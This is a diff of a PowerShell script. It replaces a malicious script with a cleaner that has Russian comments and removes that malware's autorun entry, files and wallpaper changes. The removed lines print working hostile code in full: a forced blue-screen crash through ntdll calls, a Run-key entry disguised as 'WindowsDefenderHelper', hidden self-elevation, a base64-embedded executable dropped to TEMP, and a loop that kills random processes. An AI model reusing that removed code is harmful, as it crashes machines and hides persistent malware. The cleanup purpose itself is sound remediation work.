@@ -1,70 +1,47 @@
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
+Write-Host "=== Anti-BSOD Cleaner started ===" -ForegroundColor Cyan
 
-public static class BsodHelper {
-    [DllImport("ntdll.dll", SetLastError = true)]
-    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, int Client, out bool WasEnabled);
-    
-    [DllImport("ntdll.dll", SetLastError = true)]
-    public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ResponseOption, out int Response);
-}
-"@
+# 1. Проверка и удаление автозапуска
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$badName = "WindowsDefenderHelper"
 
-function Invoke-Bsod {
-    $priv = [BsodHelper]::RtlAdjustPrivilege(19, $true, 0, [ref]$null)
-    $response = 0
-    [BsodHelper]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
+if (Get-ItemProperty -Path $regPath -Name $badName -ErrorAction SilentlyContinue) {
+    Remove-ItemProperty -Path $regPath -Name $badName -Force
+    Write-Host "[OK] Автозапуск удалён" -ForegroundColor Green
+} else {
+    Write-Host "[OK] Автозапуск не найден" -ForegroundColor Green
 }
 
-function Add-ToStartup {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $exePath = [System.IO.Path]::Combine($env:TEMP, "svchost_helper.exe")
-    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-    Set-ItemProperty -Path $regPath -Name "WindowsDefenderHelper" -Value $exePath -Type String -Force
-}
+# 2. Удаление файлов вредоноса
+$files = @(
+    "$env:TEMP\svchost_helper.exe",
+    "$env:TEMP\payload.bin"
+)
 
-function Get-AdminAccess {
-    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        $selfPath = [System.IO.Path]::Combine($env:TEMP, "svchost_helper.exe")
-        Start-Process -FilePath $selfPath -Verb RunAs -WindowStyle Hidden
-        exit
+foreach ($file in $files) {
+    if (Test-Path $file) {
+        Remove-Item $file -Force
+        Write-Host "[OK] Удалён файл: $file" -ForegroundColor Green
+    } else {
+        Write-Host "[OK] Файл не найден: $file" -ForegroundColor Gray
     }
 }
 
-function Start-Show {
-    $startTime = Get-Date
-    $endTime = $startTime.AddSeconds(120)
-    $showActions = @(
-        { Start-Process -FilePath "notepad.exe" -WindowStyle Hidden },
-        { Set-Wallpaper -Path (Get-ChildItem -Path "$env:USERPROFILE\Pictures" -Filter *.jpg -ErrorAction SilentlyContinue | Get-Random | Select-Object -ExpandProperty FullName) },
-        { $wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys([char]175) },
-        { (New-Object Media.SoundPlayer "C:\Windows\Media\notify.wav").PlaySync() },
-        { (Get-Process | Where-Object { $_.MainWindowTitle } | Get-Random).Kill() }
-    )
-    
-    while ((Get-Date) -lt $endTime) {
-        $action = $showActions | Get-Random
-        try { & $action } catch {}
-        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
-    }
-}
+# 3. Сброс обоев на стандартные
+$defaultWallpaper = "C:\Windows\Web\Wallpaper\Windows\img0.jpg"
 
-function Set-Wallpaper($Path) {
-    Add-Type @"
-using System;
+Add-Type @"
 using System.Runtime.InteropServices;
 public class Wallpaper {
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+  [DllImport("user32.dll", CharSet=CharSet.Auto)]
+  public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 }
 "@
-    [Wallpaper]::SystemParametersInfo(20, 0, $Path, 0x01 -bor 0x02)
-}
 
-Get-AdminAccess
-Add-ToStartup
-$encryptedBytes = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAF2+2FcAAAAAAAAAAOAAAiELAQsAACgAAAAGAAAAAAAAMikAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAFApAABLAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAADkJwAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAvCcAAAAgAAAAKAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAYAAAAqAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAALgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABAKQAAAAAAAEgAAAACAAUAQCgAAKAGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswBACNAAAAAQAAEQACewEAAAQKBgJvAgAACgIXKgATMAQAQwAAAAIAABECAnsBAAAEAgYXWAsCBwJ7AQAABAYXWgwrBxYNKwYXCisEFgorAxYqBwSOaR8cjmlaDCsCCwLeDCoAABMwAwAxAAAAAwAAEQACewIAAAQCewMAAAQCAgYXWRYCAgYXWgJ7AwAABBYCewIAAAQXF1kXWRhaDCsCCwLeDCoA')
-Set-Content -Path "$env:TEMP\payload.bin" -Value $encryptedBytes -Encoding Byte
-Start-Show
-Invoke-Bsod
+[Wallpaper]::SystemParametersInfo(20, 0, $defaultWallpaper, 3)
+Write-Host "[OK] Обои восстановлены" -ForegroundColor Green
+
+# 4. Блокировка опасных PowerShell-скриптов
+Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser -Force
+Write-Host "[OK] Выполнение подозрительных скриптов заблокировано" -ForegroundColor Green
+
+Write-Host "=== Очистка завершена ===" -ForegroundColor Cyan
